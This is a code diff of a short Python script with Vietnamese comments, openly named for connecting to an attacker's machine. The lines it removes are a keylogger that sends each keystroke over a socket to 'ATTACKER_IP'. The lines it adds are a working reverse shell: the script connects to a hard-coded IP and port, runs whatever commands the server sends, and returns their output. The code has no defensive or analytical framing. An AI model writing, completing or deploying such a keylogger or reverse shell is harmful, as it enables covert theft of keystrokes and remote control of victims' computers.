@@ -1,25 +1,20 @@
 import socket
-import threading
-from pynput.keyboard import Key, Listener
+import subprocess
 
-# Kết nối tới máy attacker
-def connect_to_attacker(server_ip='ATTACKER_IP', server_port=PORT):
+def connect_to_attacker(server_ip='127.0.0.1', server_port=9999):
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client.connect((server_ip, server_port))
-    return client
+    print(f"Connected to {server_ip}:{server_port}")
 
-# Hàm keylogger để ghi lại các phím bấm
-def on_press(key, client):
-    try:
-        client.send(f"{key.char}".encode('utf-8'))
-    except AttributeError:
-        client.send(f"{key}".encode('utf-8'))
+    while True:
+        command = client.recv(1024).decode('utf-8')
+        if command.lower() == 'exit':
+            break
+        if command:
+            output = subprocess.getoutput(command)
+            client.send(output.encode('utf-8'))
 
-# Lắng nghe các phím bấm
-def start_keylogger(client):
-    with Listener(on_press=lambda key: on_press(key, client)) as listener:
-        listener.join()
+    client.close()
 
 if __name__ == "__main__":
-    client = connect_to_attacker('ATTACKER_IP', 9999)
-    start_keylogger(client)
+    connect_to_attacker('192.168.1.10', 9999)  # Thay '192.168.1.10' bằng IP của server
